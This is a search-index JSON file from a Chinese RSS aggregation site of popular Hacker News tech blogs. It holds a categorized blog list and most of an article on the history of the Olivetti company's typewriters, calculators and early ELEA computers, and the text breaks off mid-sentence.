{"config":{"lang":["zh","en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"RSS \u6587\u7ae0\u805a\u5408","text":"<p>\u672c\u7f51\u7ad9\u6c47\u96c6\u4e86\u6765\u81ea Hacker News 2025\u5e74\u6700\u53d7\u6b22\u8fce\u7684\u6280\u672f\u535a\u5ba2\u6587\u7ae0\u3002</p>"},{"location":"#_1","title":"\u6570\u636e\u6765\u6e90","text":"<p>\u672c\u7ad9\u6240\u6709\u6587\u7ae0\u5747\u6765\u81ea AK\u5927\u795e\u6574\u7406\u7684RSS\u8ba2\u9605\u5217\u8868\u3002\u6211\u4eec\u901a\u8fc7\u5b9a\u671f\u6293\u53d6\u8fd9\u4e9bRSS\u6e90\uff0c\u5c06\u6700\u65b0\u7684\u6280\u672f\u535a\u5ba2\u6587\u7ae0\u6c47\u96c6\u5230\u8fd9\u91cc\uff0c\u65b9\u4fbf\u5927\u5bb6\u9605\u8bfb\u3002</p> <p>RSS\u6e90\u94fe\u63a5\uff1a HN Popular Blogs 2025 OPML</p>"},{"location":"#_2","title":"\u529f\u80fd\u7279\u70b9","text":"<ul> <li>\u81ea\u52a8\u6293\u53d6\uff1a\u6bcf6\u5c0f\u65f6\u81ea\u52a8\u66f4\u65b0\u4e00\u6b21\u6587\u7ae0</li> <li>\u5b8c\u6574\u5185\u5bb9\uff1a\u81ea\u52a8\u4ece\u539f\u6587\u9875\u9762\u6293\u53d6\u5b8c\u6574\u6587\u7ae0\u5185\u5bb9</li> <li>\u591a\u6e90\u805a\u5408\uff1a\u6db5\u76d6AI\u3001\u7f16\u7a0b\u3001\u786c\u4ef6\u3001\u521b\u4e1a\u7b49\u591a\u4e2a\u9886\u57df</li> <li>\u5feb\u901f\u641c\u7d22\uff1a\u652f\u6301\u5168\u6587\u641c\u7d22\uff0c\u5feb\u901f\u627e\u5230\u611f\u5174\u8da3\u7684\u6587\u7ae0</li> </ul>"},{"location":"#_3","title":"\u535a\u5ba2\u5217\u8868","text":"<p>\u672c\u7ad9\u5171\u805a\u5408\u4e86 35\u4e2a\u6280\u672f\u535a\u5ba2\uff0c\u5305\u62ec\uff1a</p> <ul> <li>Simon Willison - Python/Django\u4e13\u5bb6\uff0cAI\u5de5\u5177\u63a2\u7d22</li> <li>Paul Graham - YC\u521b\u59cb\u4eba\uff0c\u521b\u4e1a\u4e0e\u601d\u8003</li> <li>Jeff Geerling - \u786c\u4ef6\u548c\u5d4c\u5165\u5f0f\u7cfb\u7edf\u4e13\u5bb6</li> <li>Gary Marcus - AI\u7814\u7a76\u8005\uff0c\u5bf9AI\u53d1\u5c55\u6709\u6df1\u5165\u89c1\u89e3</li> <li>Antirez - Redis\u4f5c\u8005\uff0c\u7cfb\u7edf\u7f16\u7a0b</li> <li>... \u4ee5\u53ca\u66f4\u591a\u4f18\u8d28\u535a\u5ba2</li> </ul> <p>\u67e5\u770b\u5b8c\u6574\u535a\u5ba2\u5217\u8868</p> <p>\u672c\u7f51\u7ad9\u7531 OpenClaw \u81ea\u52a8\u7ef4\u62a4\uff0c\u6240\u6709\u6587\u7ae0\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709</p>"},{"location":"blogs/","title":"\u6240\u6709\u535a\u5ba2","text":"<p>\u4ee5\u4e0b\u662f\u672c\u7ad9\u805a\u5408\u7684\u6240\u6709\u6280\u672f\u535a\u5ba2\uff1a</p>"},{"location":"blogs/#nn-antirezcom-n-beejus-n-bernsteinbearcom-rustn-borrettime-n-danieldelaneynet-n-ericmigicom-n-evanhahncom-n-gilesthomascom-gitn-grantslattoncom-n-hugotuniusse-rustn-jeffgeerlingcom-linuxn-johndcookcom-n-keygensh-n-lucumrpocooorg-n-martinaldersoncom-n-matkladgithubio-n-maurycyzcom-n-michaelstapelbergch-n-miguelgrinbergcom-n-nesbittio-n-overreactedio-reactn-paulgrahamcom-ycn-rachelbythebaycom-n-rakhimexotextcom-n-seangoedeckecom-n-simonwillisonnet-pythondjangowebain-skyfalldev-n-timshorg-webn-xaniaorg-n-ainn-garymarcussubstackcom-n-gwernnet-ain-hermanbearblogdev-ain-pluralisticnet-n-terriblesoftwareorg-n-tomrennercom-ain-worksonmymachinesubstackcom-n-nn-antirezcom-n-construction-physicscom-n-idiallocom-n-jeffgeerlingcom-linuxn-nn-krebsonsecuritycom-n-troyhuntcom-n-nn-joanwestenbergcom-n-steveblankcom-n-wheresyouredat-n-nn-bogdanthegeekgithubio-risc-vn-dfarqhomeipnet-n-entropicthoughtscom-n-oldvcrblogspotcom-n-rightocom-n-nn-anildashcom-n-areslunaorg-n-berthubeu-n-blogjim-nielsencom-n-chadnauseamcom-n-danielwirtzcom-n-daringfireballnet-n-experimental-historycom-n-filfrenet-n-it-notesdragasnet-freebsdn-matduggancom-3dn-micahfleecom-n-philiplainecom-kubernetesn-refactoringenglishcom-n-shksprmobi-n-simoneorg-n-tediumco-n-nn-abortretryfail-n-brutecatcom-n-computerrip-n-danielchasehoopercom-cn-derekthompsonorg-n-downtowndougbrowncom-webn-dwarkeshcom-n-dynomightnet-n-elithegreenplacenet-cn-fabiensanglardnet-n-geoffreylittcom-n-geohotgithubio-ain-heyparis-n-jaydml-webn-jyndev-n-lcamtufsubstackcom-n-minimaxircom-n-mitchellhcom-terraformn-mjg59dreamwidthorg-n-tedunangstcom-nn-nn","title":"\u6280\u672f\u4e0e\u5f00\u53d1\\n\\n- antirez.com - \u6280\u672f\u535a\u5ba2\\n- beej.us - \u7f16\u7a0b\u6559\u7a0b\\n- bernsteinbear.com - Rust\u548c\u7f16\u7a0b\u8bed\u8a00\u8bbe\u8ba1\\n- borretti.me - \u6280\u672f\u535a\u5ba2\\n- danieldelaney.net - \u8f6f\u4ef6\u548c\u54f2\u5b66\\n- ericmigi.com - \u6280\u672f\u535a\u5ba2\\n- evanhahn.com - \u6280\u672f\u535a\u5ba2\\n- gilesthomas.com - Git\u4e13\u5bb6\\n- grantslatton.com - \u6280\u672f\u535a\u5ba2\\n- hugotunius.se - Rust\u7f16\u7a0b\\n- jeffgeerling.com - \u786c\u4ef6\u548c\u5d4c\u5165\u5f0f\u7cfb\u7edf\u4e13\u5bb6\uff0c\u4e13\u6ce8\u4e8eLinux\u3001\u7f51\u7edc\u3001\u786c\u4ef6\u9879\u76ee\\n- johndcook.com - \u6280\u672f\u535a\u5ba2\\n- keygen.sh - \u8f6f\u4ef6\u6388\u6743\u548c\u5206\u53d1\\n- lucumr.pocoo.org - \u6280\u672f\u535a\u5ba2\\n- martinalderson.com - \u6280\u672f\u535a\u5ba2\\n- matklad.github.io - \u6280\u672f\u535a\u5ba2\\n- maurycyz.com - \u6280\u672f\u535a\u5ba2\\n- michael.stapelberg.ch - \u6280\u672f\u535a\u5ba2\\n- miguelgrinberg.com - \u6280\u672f\u535a\u5ba2\\n- nesbitt.io - \u6280\u672f\u535a\u5ba2\\n- overreacted.io - React\u5f00\u53d1\\n- paulgraham.com - YC\u521b\u59cb\u4eba\uff0c\u5206\u4eab\u521b\u4e1a\u3001\u7f16\u7a0b\u3001\u601d\u8003\u7b49\u6df1\u5ea6\u6587\u7ae0\\n- rachelbythebay.com - \u5d4c\u5165\u5f0f\u7cfb\u7edf\\n- rakhim.exotext.com - \u4ee3\u7801\u8d28\u91cf\\n- seangoedecke.com - \u6280\u672f\u535a\u5ba2\\n- simonwillison.net - Python/Django\u4e13\u5bb6\uff0c\u5206\u4eabWeb\u5f00\u53d1\u3001AI\u5e94\u7528\u3001\u6570\u636e\u79d1\u5b66\u7b49\u5185\u5bb9\\n- skyfall.dev - \u6280\u672f\u535a\u5ba2\\n- timsh.org - Web\u5f00\u53d1\\n- xania.org - \u6280\u672f\u535a\u5ba2\\n## AI\u4e0e\u79d1\u6280\\n\\n- garymarcus.substack.com - \u6280\u672f\u535a\u5ba2\\n- gwern.net - \u6df1\u5ea6\u601d\u8003\u8005\uff0cAI\u3001\u5fc3\u7406\u5b66\u7b49\u9886\u57df\\n- herman.bearblog.dev - AI\u548c\u5de5\u5177\u601d\u8003\\n- pluralistic.net - \u6280\u672f\u535a\u5ba2\\n- terriblesoftware.org - \u6280\u672f\u535a\u5ba2\\n- tomrenner.com - AI\u548c\u601d\u8003\\n- worksonmymachine.substack.com - \u6280\u672f\u535a\u5ba2\\n## \u786c\u4ef6\u4e0e\u5de5\u7a0b\\n\\n- antirez.com - \u6280\u672f\u535a\u5ba2\\n- construction-physics.com - \u6280\u672f\u535a\u5ba2\\n- idiallo.com - \u6280\u672f\u535a\u5ba2\\n- jeffgeerling.com - \u786c\u4ef6\u548c\u5d4c\u5165\u5f0f\u7cfb\u7edf\u4e13\u5bb6\uff0c\u4e13\u6ce8\u4e8eLinux\u3001\u7f51\u7edc\u3001\u786c\u4ef6\u9879\u76ee\\n## \u5b89\u5168\\n\\n- krebsonsecurity.com - \u7f51\u7edc\u5b89\u5168\u4e13\u5bb6\\n- troyhunt.com - \u6280\u672f\u535a\u5ba2\\n## \u521b\u4e1a\u4e0e\u5546\u4e1a\\n\\n- joanwestenberg.com - \u6280\u672f\u535a\u5ba2\\n- steveblank.com - \u521b\u4e1a\u65b9\u6cd5\u8bba\\n- wheresyoured.at - \u6280\u672f\u535a\u5ba2\\n## \u7cfb\u7edf\u4e0e\u5386\u53f2\\n\\n- bogdanthegeek.github.io - RISC-V\u548c\u5d4c\u5165\u5f0f\\n- dfarq.homeip.net - \u6280\u672f\u535a\u5ba2\\n- entropicthoughts.com - \u6280\u672f\u535a\u5ba2\\n- oldvcr.blogspot.com - \u590d\u53e4\u8ba1\u7b97\u673a\\n- righto.com - \u6280\u672f\u535a\u5ba2\\n## \u6587\u5316\u4e0e\u751f\u6d3b\\n\\n- anildash.com - \u6280\u672f\u535a\u5ba2\\n- aresluna.org - \u6280\u672f\u535a\u5ba2\\n- berthub.eu - \u6280\u672f\u535a\u5ba2\\n- blog.jim-nielsen.com - \u6280\u672f\u535a\u5ba2\\n- chadnauseam.com - \u6280\u672f\u535a\u5ba2\\n- danielwirtz.com - \u751f\u4ea7\u529b\u5de5\u5177\\n- daringfireball.net - \u6280\u672f\u535a\u5ba2\\n- experimental-history.com - \u6280\u672f\u535a\u5ba2\\n- filfre.net - \u6280\u672f\u535a\u5ba2\\n- it-notes.dragas.net - FreeBSD\u548c\u7cfb\u7edf\u7ba1\u7406\\n- matduggan.com - 3D\u6253\u5370\u548c\u5f00\u6e90\\n- micahflee.com - \u6280\u672f\u535a\u5ba2\\n- philiplaine.com - Kubernetes\u548c\u4e91\u539f\u751f\\n- refactoringenglish.com - \u91cd\u6784\u548c\u4ee3\u7801\u8d28\u91cf\\n- shkspr.mobi - \u6280\u672f\u535a\u5ba2\\n- simone.org - \u827a\u672f\u548c\u521b\u610f\u601d\u8003\\n- tedium.co - \u6280\u672f\u535a\u5ba2\\n## \u5176\u4ed6\\n\\n- abortretry.fail - \u7f16\u7a0b\\n- brutecat.com - \u7f16\u7a0b\\n- computer.rip - \u8ba1\u7b97\u673a\u5386\u53f2\u548c\u9006\u5411\u5de5\u7a0b\\n- danielchasehooper.com - C\u8bed\u8a00\u7f16\u7a0b\\n- derekthompson.org - \u7ecf\u6d4e\u548c\u6280\u672f\\n- downtowndougbrown.com - Web\u5f00\u53d1\\n- dwarkesh.com - \u7ecf\u6d4e\u548c\u6280\u672f\\n- dynomight.net - \u6570\u5b66\u548c\u79d1\u5b66\\n- eli.thegreenplace.net - C++\u6559\u7a0b\\n- fabiensanglard.net - \u56fe\u5f62\u7f16\u7a0b\\n- geoffreylitt.com - \u5206\u5e03\u5f0f\u7cfb\u7edf\\n- geohot.github.io - \u9ed1\u5ba2\u548cAI\\n- hey.paris - \u6280\u672f\u548c\u601d\u8003\\n- jayd.ml - Web\u5f00\u53d1\\n- jyn.dev - \u7f16\u7a0b\u8bed\u8a00\\n- lcamtuf.substack.com - \u5b89\u5168\u7814\u7a76\\n- minimaxir.com - \u6570\u636e\u79d1\u5b66\\n- mitchellh.com - Terraform\u548c\u4e91\u57fa\u7840\u8bbe\u65bd\\n- mjg59.dreamwidth.org - \u5b89\u5168\u7814\u7a76\\n- tedunangst.com - \u7f16\u7a0b\\n\\n---\\n\\n\u70b9\u51fb\u535a\u5ba2\u540d\u79f0\u67e5\u770b\u8be5\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0","text":""},{"location":"abortretry.fail/A%20Brief%20History%20of%20Sega%20Enterprises_20260205/","title":"A Brief History of Sega Enterprises","text":"<p>\u6765\u6e90: https://abortretry.fail \u94fe\u63a5: https://www.abortretry.fail/p/a-brief-history-of-sega-enterprises \u65e5\u671f: Mon, 12 Jan 2026 04:02:27 GMT</p> <p> Read more </p>"},{"location":"abortretry.fail/The%20Olivetti%20Company_20260205/","title":"The Olivetti Company","text":"<p>\u6765\u6e90: https://abortretry.fail \u94fe\u63a5: https://www.abortretry.fail/p/the-olivetti-company \u65e5\u671f: Mon, 08 Dec 2025 03:01:47 GMT</p> <p>Top: Ivrea, Bottom: Camillo Olivetti</p> <p>The town of Ivrea is quite old and has a rich history, but today, its population has shrunk from around 90,000 in 1970 to just over 20,000 in the 2020s. In the 1400s, Ivrea gained small Jewish community. By the mid 1800s, Salvador Benedetto Olivetti was a successful textile merchant in that community, and he married Elvira Sacerdoti, a banking heiress from Modena. Salvador and Elvira had Samuel David Camillo Olivetti on the 13th of August in 1868. Tragically, Salvador passed away when Camillo was just a year old. Camillo, whether the result of his father's death or just his wiring, had a rather solitary nature. He was impetuous, rebellious, nonconformist, and prone to rather sudden outbursts. By all accounts, Elvira did well by her children, Camillo and Emma. They were taught multiple languages, versed in culture and politics, and they were taught to be open-minded. Camillo attended Calchi-Taeggi College in Milan (a boarding school) and then went on to the Royal Industrial Museum (Polytechnic University of Turin today).</p> <p>Royal Industrial was the first school of its kind in Italy, a school of electrical engineering. Among the prominent minds there was Galileo Ferraris who'd independently developed AC power, invented the induction motor, and taught Olivetti. Olivetti graduated in 1891, and he went to work at a manufacturing firm in London that produced tools for electrical measurement. This was a short lived endeavor, and Olivetti returned to Turin to work for Ferraris. In 1893, Olivetti accompanied Ferraris to the Chicago Electricity Congress and the World's Columbian Exposition. The two then made their way to West Orange Laboratories in Llewellyn Park, New Jersey to visit Tomas Edison. Olivetti had a positive view of Edison, but he noted that Edison and Ferraris had a difficult time conversing. Ferraris didn't speak much English, and Edison was hard of hearing. Due to these barriers, Olivetti had to translate for Ferraris\u2026 rather loudly.</p> <p>Ferraris left the United States to return to Italy, but Olivetti chose to continue his adventure. He visited Pittsburgh, Albany, Boston, New York, Salt Lake, and San Francisco. It was the Bay Area that occupied the majority of his time in the USA from what I can tell. He served as an assistant electrical engineer at Stanford from November of 1893 to April of 1894, and he was able to conduct various experiments into the usage and application of electricity.</p> <p>Olivetti viewed both the British and the American industrial and economic environments favorably, and when he returned to Italy, he sought to build. His first enterprise was to represent the Victor bicycle and Williams typewriter companies in Italy. This didn't last long. Then with his classmates Dino Gatta and Michele Ferrero, he opened a factory that produced electric metering equipment This company and factory relocated to Milan in 1904. While this had some success, it wasn't fulfilling for Olivetti.</p> <p>The Olivetteria</p> <p>In 1899, Camillo Olivetti met Luisa Revel. Revel was the daughter of a pastor, and she was rather shy. The two were as opposite as one could imagine, but they fell in love and married. They had six children: Elena (1900), Adriano (1901), Massimo (1902), Silvia (1904), Lalla (1907), and Dino (1912). The children were home schooled for much of their primary educations, and Olivetti wanted them to play and enjoy the sun in their youths as much as possible.</p> <p>First Olivetti factory, Ivrea</p> <p>Casa Olivetti</p> <p>On the 29th of October in 1908, Camillo Olivetti registered Ingegneria Camillo Olivetti &amp; Compagnia with the Notary. The initial funding was 350,000 lire (about 2.9 million USD in 2025 dollars) with Olivetti holding a majority of the company and 13 partners having smaller stakes. With the first factory for his new typewriter company being built, Olivetti wanted a home nearby. He purchased the Convento di San Bernardino which then became Casa Olivetti. The setting of a former convent is fitting. Whether a result of his personal and political beliefs, his wife's influence, divine revelation, or some combination of these elements, Olivetti converted to Unitarianism. I imagine that in particular, the Unitarian faith's strict monotheism would have been familiar to him having been raised in Judaism, and the Unitarian emphasis on reason, science, and philosophy would have been attractive to him as an engineer.</p> <p>Over the course of six months in what was formerly the chapel and now his private study, Olivetti developed the prototype of his first typewriter. Of course, Olivetti didn't intend to be second-rate. He took another trip to the USA to familiarize himself with the best practices for typewriter production (particularly at Remington, after acquisition that company became Remington Rand), and he returned to Ivrea in late 1909 or early 1910 with Brown and Sharpe automatic lathes and milling machines. His first four employees were Valentino Prelle, Giuseppe Trompetto, Pietro Bronzini and Stefano Pretti. At the World's Fair in 1911 (April through November) in Turin, the M1 was displayed to the public for the first time. Also on display were the machine tools used in the production of the typewriters, and it was somewhat clear that Olivetti was as proud (if not more so) of his production methods as he was his products. The fair's catalogue stated that Olivetti was the first and only typewriter factory in Italy, and of the M1 it mentioned that the product was first class, patented in several countries, of an original design, producing legible characters with a standard keyboard, a two-color ribbon, a decimal tabulator, back-space, and margin adjustment.</p> <p>The Olivetti M1</p> <p>The first large order for Olivetti machines came shortly after the Fair with the Italian Navy ordering 100. This was followed by another sizable order in 1912 from the Italian postal service. The M1 was usually sold for 550 lire and around 6000 were produced. It was a complicated machine with around 3000 parts, all of which were handmade. The completed typewriter weighed around 37 pounds, had 42 keys, 84 signs. Every description of this machine notes that the M1 was exceptional with rapid operation, high quality construction, and great reliability.</p> <p>As I have been unable to find the exact date on which that price was set, ascertaining the relative price of the M1 today is difficult. If I assume that this price was set in 1911, the total price in 2025 dollars would be something like $3885.32. I cannot imagine many orders at such a price. Yet, this same price of 550 lire would equate to something around $1200 in 1918. One interesting anecdote was that the M1 was about 100 lire more than a Remington. So, this would place the price of the M1 around $1670 in 1912 adjusted to 2025 dollars.</p> <p>In running his company, Camillo Olivetti was a generous and familiar man. He implemented a shortened work week, humane factory conditions, high wages, nine and a half months of paid maternity leave, child care, family welfare, worker's housing, recreation facilities, educational services, and profit sharing. He didn't separate himself from the workers in his factories, and he maintained friendships with many of them. This camaraderie led to many decisions being made as a group rather than being made top-down. As for his view of the company's production, he embraced a policy of vertical integration. Product design, research, manufacturing, and sales were done in-house. The parts for every product were likewise produced by the company itself. With a demand for extremely high quality and superior engineering, workers would be educated and trained at Olivetti if they lacked adequate experience. All of this made Olivetti an attractive place to work, and the company grew from 20 employees in 1911 to 110 employees by 1913. Those 110 employees could produce 23 to 28 typewriters each week.</p> <p>The years 1915 through 1918 were rough on the company with Europe at war. The work week was reduced to 30 hours, workers often had to defer wages to keep the company running, and the factory was converted for wartime needs. At the end of the Great War, the Olivetti company took advantage of some of its recent factory modifications to expand into the office supplies business becoming an Italian equivalent of Remington, a major distinction being that Olivetti's products were intended to be not only of high quality, but things of beauty. From the minds of designer Marcello Nizzoli, calligrapher Giovanni Mardersteig, and artists Luigi Munari, Ettore Sottsass, Luigi Veronesi, and Gianni Pintori came products that were every bit as visually stunning as they were mechanically sound.</p> <p>Olivetti M20, 1920, original images from Museo Nicolis</p> <p>The M20 was unveiled at the Brussels Exhibition of 1920. Compared to its predecessor, the M20 was physically smaller, lighter, and had a fixed carriage. It was also incredibly successful. Four years after introduction, the company's Ivrea factory had 400 workers producing 4000 units per annum. By 1926, this increased to 500 workers and 8000 units per annum, then to 13,000 per annum by the end of 1929. The design of the M20 wasn't completely static, and it received updates throughout the 1920s.</p> <p>Factory and transport employees loading packaged typewriters</p> <p>On the 22nd of January in 1929, Olivetti's first international expansion was established with the Hispano Olivetti Company.</p> <p>Adriano Olivetti</p> <p>The Olivetti family were mildly socialist in their political attitudes, and while Camillo may have converted to Unitarianism, his wife and children remained Waldensian Christians in keeping with their upbringing. In 1922, the National Fascist Party had gained control of the Kingdom of Italy. Camillo Olivetti's son, Adriano, graduated from Polytechnic University of Turin in 1924. Adriano was opposed to fascism, and he aided in the escape of several political prisoners including Filippo Turati, Ferruccio Parri, and Carlo Rosselli during his first year following university while working as a technical assistant in the engineering group at Olivetti. Like his father before him, he went to the USA, but unlike his father, his trip served to get him away from the authorities. That isn't to say he didn't study industry while there, because he most certainly did. For the younger Olivetti, the visit was dominated by Henry Ford's production lines, and Remington's organizational systems. Returning to Italy and to the company, Adriano was promoted to the head of mechanical design where he was in charge of the product development processes. In early 1929, he was promoted to the position of technical director. In this position, he was the leader of all engineering and production operations. That same year, the Concordat of 1929 made Roman Catholicism the sole religion of Italy. Unsurprisingly, Adriano suddenly became a member of the party, but we know that this was merely a matter of appearances as the factory in Ivrea offered food, false identities, and shelter for fugitives of the regime; activities which continued until May of 1945.</p> <p>Olivetti M40</p> <p>The Olivetti M40 was released in 1930 replacing the M20. The M40 had keys requiring less force to operate and thus allowed a higher typing speed. It maintained the Olivetti reputation for quality, had a QZERTY layout complete with spacebar, two shift keys, one capital lock key, backspace, and two keys allowing for the changing of the ribbon color. The M40 was in production until 1948, saw numerous updates and revisions, and sold quite well. The M40 was engineered by Camillo, and production was managed by Adriano.</p> <p>Olivetti MP1, image from typewriter.company</p> <p>Following the success of the M40, Adriano was promoted to the position of general manager in which he handled the management of all day to day activities of the company. That same year, the company released the Modello Portatile 1, or MP1, create by Gino Martinoli, Adriano Olivetti, Riccardo Levi, Aldo Magnelli, and Adriano Magnelli. This was the company's first portable typewriter, and it weighed 11.46 pounds. While the M1 and M20 were offered in any color you wanted as long as that color was black, the MP1 was far more lively with red, blue, brown, and green as options.</p> <p>With the company now competing in office products, typewriters, and mobile equipment, Olivetti continued their international expansion with offices across much of Europe and Latin America. Production tripled from 1933 to 1937, and in 1938, Adriano became the president of the company. Naturally, this production increase required more workers, and those workers needed housing. Adriano then undertook urban planning and infrastructure development in Ivrea creating neighborhoods of three and four story flats with green spaces. These were designed by prominent and well-known architects. From the 1930s through the 1960s, the Olivetti family would invest roughly 3 billion lire in worker welfare in the form of housing, child care, schools, professional training centers, and more. With Olivetti's presence in the town, Ivrea grew from around 15,000 to more than 30,000 by the late 1950s. That number would triple by the mid-1970s.</p> <p>During World War II, Adriano's resistance to fascism grew. On a trip to Switzerland in 1942, he met Allen Dulles who was then the Swiss Director of the US Office of Strategic Services. Adriano became agent 660 of the OSS on the 15th of June in 1943. Mussolini was removed from power on the 25th of July in 1943 through the efforts of Dino Grandi with support from King Victor Emmanuel III. Marshal Pietro Badoglio then became the Prime Minister. Adriano was arrested and imprisoned at Regina Coeli in Rome for conspiring with the enemy, but Italy was in chaos. This chaos allowed him to escape, but he was a fugitive from the law who was variously hiding and running for around six months. Camillo passed away in December, and it is unclear if Adriano was able to be present with his family. Finally in February of 1944, Adriano reached the safety of Switzerland where he once again made contact with Dulles, and he operated his counter-regime efforts from there. Olivetti in Ivrea continued to offer assistance to those fleeing persecution and Adriano supplied the allies with intelligence. In the fighting in Italy, resistance to the regime cost the lives of 24 workers at Olivetti's Ivrea location, but in the end, the regime was defeated. As peace arrived, Olivetti returned to Italy in May of 1945.</p> <p>Through all of this, Adriano's views had solidified to be completely against fascism, oligarchic capitalism, and marxism. He sought something different, and this he formulated as the Community Movement. He believed in a federalism comprised of territorial units that were both culturally homogeneous and economically autonomous. He believed this to be the only path toward uniting industrialization, humanitarianism, and participatory democracy. Outside of politics, his spirit had also moved, and Adriano converted to Catholicism in 1949. These changes in his thinking led him to become the mayor of Ivrea and later to hold a seat in the Italian parliament.</p> <p>Divisumma 14</p> <p>After the war, Olivetti expanded into the calculator market with Divisumma 14 in 1947. The desktop electro-mechanical calculator could perform addition, subtraction, multiplication, and division and print the results. It was the first printing electric calculator to be capable of all four functions and the first to include a negative balance function. The Divisumma 14 also offered a few convenience features. The user could input data merely for reference in print and not calculation, a calculate without print option to avoid polluting the print with unnecessary data, and a stop for avoiding infinite loops such as when attempting to divide by zero. It was offered in beige and blue. The industrial design came from Marcello Nizzoli while the mechanical and electrical design came from autodidact Natale Capellaro. Various iterations on this design were then produced with fewer features at lower price points. Other variations were created specifically for currencies. Later revisions on the design would also add a joystick rather than the two sliders for cursor placement. This design was later refined with Divisumma models 22, 24, and 26.</p> <p>While Adriano had fled to Switzerland, things hadn't been quite as easy for Enrico Fermi. Having become a professor in 1926 at the age of just 24, he lacked the claims of vital economic importance that had aided the Olivetti family. In 1938, the Italian racial laws made things difficult and dangerous for his wife, Laura, and several of members of his research team. This pushed Fermi to the USA where he arrived on the 2nd of January in 1939 in New York City. As a well known man, he had offers from five universities, and he chose Columbia. Fermi's first lecture to the US military about nuclear energy was given on the 18th of March in 1939, and by August of 1941, he was working with six tons of uranium and thirty tons of graphite. Ultimately, Fermi ended up at Los Alamos as associate director.</p> <p>In 1949, Enrico Fermi was visiting Italy, and that visit included a trip to Olivetti's factory in Ivrea. Adriano and Fermi discussed several topics, but the most important conversation was one in which Fermi urged Adriano to consider building computers as Fermi felt that the machines would be vital to the future.</p> <p>In 1952, Olivetti opened a research center in New Canaan, Connecticut to observe US developments in computing (the company's offices in the USA were in New York City). In 1954, Adriano met Mario Tchou Wang Li in New York. Tchou was born in Rome, spoke Italian, Mandarin, and English fluently, and earned his bachelor's degree in engineering from the Catholic University of America in Washington, and then earned his master's in nuclear physics from the Polytechnic School of Brooklyn in 1949. At the time of their meeting, Tchou was working as an associate professor at Columbia. To Adriano, Tchou was precisely the kind of man Olivetti needed. Adriano offered him a job, Tchou accepted. In December of 1954, he arrived in Pisa.</p> <p>With Tchou as the head of the Laboratorio di Ricerche Elettroniche at Olivetti, the site of the company's efforts had to be selected. The first location was the Physics Department of the University of Pisa in cooperation with the school's Centro Studi Calcolatrici Elettroniche. The Olivetti team helped the school complete the Calcolatrice Elettronica Pisana in 1957, remarkable as the first entirely Italian electronic computer. </p> <p>ELEA 9001 console, image by Paolo Monti CCASA 4.0</p> <p>During the building of the university's computer, the Olivetti team moved to a nearby villa, and Tchou began recruiting the twelve best young minds he could from the school and surrounding area, and one veteran of the industry, the Canadian Martin Friedman who'd worked on magnetic memory for the Ferranti Mark I. By the end of 1955, the research group numbered about 25. This group immediately set out to build the prototype of a commercial machine, the Macchina Zero also known as the Elaboratore Elettronico Aritmetico 9001, or ELEA 9001. This first machine was a vacuum tube computer, and it was only used internally by Olivetti. Similarly, the 9002 came after this aiming to reduce costs and increase reliability.</p> <p>ELEA 9003</p> <p>Upon completion of the 9002, Tchou gathered his senior researchers and told them that this machine simply wouldn't do. Olivetti would launch a fully transistorized mainframe computer. For this, the company allied itself with Fairchild, and launched its own transistor company, Societa Generale Semiconduttori, in 1957. The two companies then codeveloped the planar process for integrated circuit manufacturing. The prototype transistorized ELEA was completed in late 1958. This became the ELEA 9003 which was presented to the President of the Republic Giovanni Gronchi on the 8th of November in 1959. This machine weighed in at about five tons, and it could run 8000 to 10,000 instructions per second. It was built with transistor-diode logic and core memory. The ELEA 9003 wasn't built with the concept of words (not really anyway). Each memory location could hold a single alphanumeric character with an instruction being eight characters long. The base memory was thus 20,000 memory locations and could be extended to 160,000 or 20K 8bit instructions or about 26,666 6bit characters. With a cycle time of about 10 microseconds, the computer's speed was approximately 100KHz. Uptime wasn't great, just shy of 50% per day, typically being available only between the latter part of each morning to the early part of the evening. This improved over time. The 9003 was capable of limited multitasking with three processes being able to be run simultaneously. At the time of introduction, those programs could be written only in machine language. The machine had no dynamic memory allocation so each program was loaded contiguously and always at the same memory location. By convention, the first 3,000 characters were left available for testing programs. Over time, Olivetti made an assembler, Psico, available along with testing software, a monitor program, and tape handling software. For I/O, the 9003 offered card reader/punch, tape, printer, and of course, an Olivetti typewriter. </p> <p></p> <p>The cabinets of the 9003 were made to be fully accessible by a human without the need for ladders standing just shy of five feet high, and the wiring was in overhead conduits rather than under the floor. The contents of each cabinet were color coded with strips that indicated power, memory, ALU, control unit, and the like, and each was arranged in three parts, opening like a book. </p> <p>Forty 9003s were installed, offered via lease between 1959 and 1964. The first 9003 was installed at Marzotto in Valdagno, and the second was installed at Banca Monte dei Paschi di Siena. This second example is the only currently known to be complete and functional, and it was donated to the Enrico Fermi Technical Institute in Bibbiena by the bank.</p> <p>The ELEA 6001 was released in 1961 as a smaller and more affordable computer though it was still a mainframe of several cabinets. This computer shipped in two different versions, one for the sciences and one for commercial use, designated by the suffix of S or C to the numeric designation. Characters were four bits which led to some complexities when using machine code (various signifier bits preceding or following a character), and the memory configurations available ranged from 10,000 to 100,000 4bit characters of core with 40,000 being the most common. With little memory on hand and with various schemes aimed at efficient use, the 6001 was shipped with FORTRAN for scientific uses, and with Palgo (Algol dialect) for commercial uses. This machine sold between 140 and 170 units depending upon which source one prefers to trust.</p> <p>Sadly, Adriano passed away rather suddenly in February of 1960 from a cerebral thrombosis while on a train to Switzerland. Tchou died in a car accident on the 9th of November in 1961 on his way from Milan to Ivrea to discuss a new line of computers built from ICs with management. The two had planned to launch their computers in the United States following Olivetti's 1959 acquisition of the Underwood typewriter company, but after their deaths, this expansion plan was cancelled. Some workers, documentarians, and Adriano's personal guard alleged that their deaths were perpetrated by CIA (successor to OSS), but this was countered by the Tchou family who stated there wasn't any evidence of foul play.</p> <p>Roberto Olivetti</p> <p>Robert Olivetti was the eldest son of Adriano and was born in Turin on the 18th of March in 1928. He was educated in business administration at Bocconi in Milan, and then at Harvard. He joined the company in 1955, and became the director of the electronics division in 1959. He became CEO in 1962.</p> <p>By 1960, the research group had moved to Milan, and Federico Faggin joined the company in autumn of that year. He was tasked with designing a small, inexpensive, personal computer. This machine used 1000 logic gates made out of germanium transistors, and it used 200 PCBs. I/O was done with a teletype. The computer was completed in 1961.</p> <p>From 1962 to 1964, Roberto was trying to keep the computer business running. The purchase of Underwood was a financial burden, and the passing of both Adriano and Tchou had left development idle. With pressure from the US 